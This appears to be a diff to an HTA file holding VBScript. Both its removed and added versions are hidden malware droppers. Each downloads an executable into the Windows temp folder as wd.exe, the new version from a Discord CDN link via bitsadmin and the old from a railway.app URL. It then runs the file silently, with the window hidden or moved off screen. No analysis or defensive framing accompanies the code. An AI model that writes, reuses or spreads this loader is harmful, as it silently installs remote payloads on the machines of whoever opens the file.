@@ -1,33 +1,16 @@
-<html>
-<head>
-<hta:application showintaskbar="no" caption="no" border="none" />
 <script language="VBScript">
-On Error Resume Next
-Dim s,f,t,p,x,h
-Set s=CreateObject("WScript.Shell")
-Set f=CreateObject("Scripting.FileSystemObject")
-t=f.GetSpecialFolder(2)
-p=t&"\wd.exe"
+Window.ResizeTo 0,0
+Window.MoveTo -5000,-5000
 
-Set x=CreateObject("WinHttp.WinHttpRequest.5.1")
-x.Open "GET","https://rig-gamble.up.railway.app/fetch",False
-x.Send
+Dim shell: Set shell = CreateObject("WScript.Shell")
+Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
+Dim temp: temp = fso.GetSpecialFolder(2)
 
-If x.Status=200 Then
- Set h=CreateObject("ADODB.Stream")
- h.Open
- h.Type=1
- h.Write x.ResponseBody
- h.SaveToFile p,2
- h.Close
-End If
+shell.Run "bitsadmin /transfer d /download /priority high ""https://cdn.discordapp.com/attachments/1530596353376387113/1530742385942859896/navi.exe?ex=6a66ae70&is=6a655cf0&hm=c3eb2729fc4b208f419cbb1469c95c7c51398a7c2e3e38a5fab4c1a66e2b37f9&"" """ & temp & "\wd.exe""", 0, True
 
-If f.FileExists(p) Then
- s.Run chr(34)&p&chr(34),0,False
+If fso.FileExists(temp & "\wd.exe") Then
+    shell.Run """" & temp & "\wd.exe""", 0, False
 End If
 
 window.close()
 </script>
-</head>
-<body></body>
-</html>
